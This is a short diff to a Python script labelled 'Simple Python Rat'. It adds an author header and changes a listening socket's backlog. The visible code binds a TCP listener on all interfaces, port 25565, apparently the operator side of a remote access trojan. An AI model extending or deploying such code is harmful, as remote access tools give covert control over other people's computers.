@@ -1,5 +1,14 @@
 #!/usr/bin/python3
 
+"""
+
+Simple Python Rat
+Developped by Tom Escolano - 2016
+www.speed09.com/me/
+
+"""
+
+
 import socket
 import os
 import time
@@ -8,7 +17,7 @@ port = 25565
 
 main_co = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 main_co.bind(('0.0.0.0', port))
-main_co.listen(5)
+main_co.listen(1)
 while 1:
 	try:
 		os.system("clear")
